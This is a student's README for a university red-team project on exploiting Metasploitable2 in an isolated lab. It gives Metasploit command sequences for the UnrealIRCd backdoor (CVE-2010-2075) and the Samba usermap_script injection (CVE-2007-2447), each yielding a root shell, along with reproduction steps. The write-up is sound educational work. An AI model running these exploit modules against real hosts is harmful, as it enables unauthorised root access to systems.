# CY376: Network Monitoring, Security and Auditing — Red Team Project

**Penetration Testing of a Vulnerable Network Host: Exploitation of UnrealIRCd and Samba Services on Metasploitable2**

[![Track](https://img.shields.io/badge/Track-Red%20Team-red)]()
[![Status](https://img.shields.io/badge/Status-Complete-brightgreen)]()
[![Findings](https://img.shields.io/badge/Critical%20Findings-2-critical)]()

-----

## Table of Contents

- [Overview](#overview)
- [Author](#author)
- [Key Findings Summary](#key-findings-summary)
- [Tools Used](#tools-used)
- [Repository Structure](#repository-structure)
- [Lab Environment](#lab-environment)
- [Methodology](#methodology)
- [Finding 1: UnrealIRCd Backdoor (CVE-2010-2075)](#finding-1-unrealircd-backdoor-cve-2010-2075)
- [Finding 2: Samba Command Injection (CVE-2007-2447)](#finding-2-samba-command-injection-cve-2007-2447)
- [How to Reproduce](#how-to-reproduce)
- [Ethical and Safety Notes](#ethical-and-safety-notes)
- [References](#references)

-----

## Overview

This repository contains the full Red Team project submission for **CY376: Network
Monitoring, Security and Auditing**. The project simulates a real-world penetration
test against **Metasploitable2**, an intentionally vulnerable Linux virtual machine,
from a **Kali Linux** attack platform — entirely within an isolated, host-only
virtual network with no exposure to any external system.

The assessment followed a standard four-phase methodology — **reconnaissance,
enumeration, exploitation, and post-exploitation verification** — and successfully
achieved unauthenticated remote code execution with **full root privileges** via two
independent, CVE-identified vulnerabilities.

## Author

|Field       |Detail                                           |
|------------|-------------------------------------------------|
|Name        |Cyril Akwara Adolwine                            |
|Index Number|FCM.41.018.033.23                                |
|Class       |CY3B                                             |
|Course      |CY376 — Network Monitoring, Security and Auditing|
|Track       |Red Team                                         |
|Institution |University of Mines and Technology, Tarkwa       |

## Key Findings Summary

|#|CVE                                                            |Vulnerability             |Service                          |Access Achieved|Severity|
|-|---------------------------------------------------------------|--------------------------|---------------------------------|---------------|--------|
|1|[CVE-2010-2075](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)|Backdoor Command Execution|UnrealIRCd 3.2.8.1 (TCP 6667)    |Root (uid=0)   |Critical|
|2|[CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)|Command Injection         |Samba 3.0.20-Debian (TCP 139/445)|Root (uid=0)   |Critical|

Both vulnerabilities were exploited with **no authentication required** and **no
privilege escalation step needed** — each exploit delivered root access directly.
See [`configs/vulnerability-register.yaml`](configs/vulnerability-register.yaml)
for the structured findings record, including a third, unexploited finding
(anonymous FTP access).

## Tools Used

|Tool                        |Role                                                  |
|----------------------------|------------------------------------------------------|
|**VMware Fusion**           |Type-2 hypervisor hosting both virtual machines       |
|**Kali Linux 2026.2**       |Attacker platform, pre-loaded with security tooling   |
|**Metasploitable2**         |Intentionally vulnerable target (Rapid7)              |
|**Nmap 7.99**               |Network reconnaissance and service/version enumeration|
|**Metasploit Framework 6.4**|Exploit delivery and post-exploitation                |

## Repository Structure

```
CY376-RedTeam-Project/
├── README.md                  # This file
├── .gitignore                 # Excludes secrets, credentials, VM files
├── docs/
│   ├── CY376 RedTeam Report final.pdf   # Full written report
│   └── process-notes.md       # Working notes: decisions, issues, fixes
├── evidence/
│   ├── nmap-scan-1.png        # Recon scan output (part 1)
│   ├── nmap-scan-2.png        # Recon scan output (part 2)
│   ├── nmap-scan-3.png        # Recon scan output (part 3)
│   ├── unrealircd-exploit-root-shell.png
│   └── samba-usermap-exploit-root-shell.png
├── configs/
│   ├── network-topology.yaml  # Lab network configuration reference
│   └── vulnerability-register.yaml  # Structured findings record
└── scripts/
    ├── 01_recon_scan.sh              # Automated Nmap recon
    ├── 02_exploit_unrealircd.rc      # Metasploit resource script — Finding 1
    ├── 03_exploit_samba_usermap.rc   # Metasploit resource script — Finding 2
    └── 04_run_all_exploits.sh        # Runs both exploits, logs output
```

## Lab Environment

All testing was conducted on a single Intel-based MacBook Pro host using VMware
Fusion. Both virtual machines were configured on an isolated **“Private to my
Mac”** (host-only) network — no bridge to the physical network interface, no NAT,
no route to the internet.

|Role    |Machine                      |IP Address      |
|--------|-----------------------------|----------------|
|Attacker|Kali Linux 2026.2            |`172.16.232.130`|
|Target  |Metasploitable2 (Ubuntu 8.04)|`172.16.232.131`|

Full topology detail: [`configs/network-topology.yaml`](configs/network-topology.yaml)

```
       VMware Fusion "Private to my Mac" Network (isolated, no NAT/Bridge)

  +---------------------------+       +---------------------------+
  |   Kali Linux (Attacker)   |       |  Metasploitable2 (Target) |
  |   172.16.232.130          | <---> |  172.16.232.131           |
  |   Tools: Nmap, Metasploit |       |  Intentionally vulnerable |
  +---------------------------+       +---------------------------+
```

## Methodology

1. **Reconnaissance** — `nmap -sV -sC` against the target to enumerate open
   ports, services, and versions.
1. **Vulnerability identification** — cross-referencing service versions
   against known CVEs.
1. **Exploitation** — Metasploit modules configured and run against each
   identified vulnerability.
1. **Verification** — `sysinfo`, `getuid`, `whoami`, `id`, `uname -a` run
   within each resulting session to confirm and document access level.

Full methodology, reasoning, and analysis: see the written report in
[`docs/`](docs/).

## Finding 1: UnrealIRCd Backdoor (CVE-2010-2075)

The target’s UnrealIRCd 3.2.8.1 corresponds to a compromised source
distribution containing a backdoor: a crafted string sent during the IRC
handshake is executed directly as a shell command, with no authentication.

```bash
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 172.16.232.131
set LHOST 172.16.232.130
exploit
```

**Result:** Meterpreter session opened; `getuid` confirmed `root`.
Evidence: [`evidence/unrealircd-exploit-root-shell.png`](evidence/unrealircd-exploit-root-shell.png)
Resource script: [`scripts/02_exploit_unrealircd.rc`](scripts/02_exploit_unrealircd.rc)

## Finding 2: Samba Command Injection (CVE-2007-2447)

The target’s Samba 3.0.20-Debian is vulnerable to command injection via the
`username map script` configuration option, which fails to sanitise shell
metacharacters in a supplied username.

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 172.16.232.131
exploit
```

**Result:** Command shell session opened; `whoami`/`id` confirmed `root`.
Evidence: [`evidence/samba-usermap-exploit-root-shell.png`](evidence/samba-usermap-exploit-root-shell.png)
Resource script: [`scripts/03_exploit_samba_usermap.rc`](scripts/03_exploit_samba_usermap.rc)

## How to Reproduce

1. Install [VMware Fusion](https://www.vmware.com/products/fusion.html).
1. Download the official [Kali Linux VMware image](https://www.kali.org/get-kali/#kali-virtual-machines).
1. Download [Metasploitable2](https://sourceforge.net/projects/metasploitable/).
1. Import both into Fusion; set **both** VMs’ network adapters to
   **“Private to my Mac”** before first boot.
1. Boot both VMs; confirm connectivity with `ping` between them.
1. From Kali, run:
   
   ```bash
   ./scripts/01_recon_scan.sh <target-ip>
   ```
1. Reproduce each exploit:
   
   ```bash
   msfconsole -r scripts/02_exploit_unrealircd.rc
   msfconsole -r scripts/03_exploit_samba_usermap.rc
   ```
   
   Or run both in sequence with logging:
   
   ```bash
   ./scripts/04_run_all_exploits.sh
   ```
1. See [`docs/`](docs/) for the full written report, methodology, and analysis.

## Ethical and Safety Notes

All testing in this project was conducted exclusively against a purpose-built
vulnerable machine owned and operated by the author, on a private, host-only
network with no route to the internet or any third-party system. No real,
production, or unauthorised system was scanned, probed, or accessed at any
point. This work is intended solely for academic demonstration as part of the
CY376 course and should not be replicated against systems without explicit
authorisation.

## References

- MITRE, [CVE-2010-2075](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)
- MITRE, [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
- Rapid7, [Metasploit Documentation](https://docs.metasploit.com/)
- Rapid7, [Metasploitable2](https://sourceforge.net/projects/metasploitable/)
- MITRE, [ATT&CK Framework](https://attack.mitre.org/)

Full reference list with citation formatting is available in the written
report under `docs/`.

-----

**Repository:** https://github.com/cyrilakwarah-sudo/CY376-RedTeam-Project
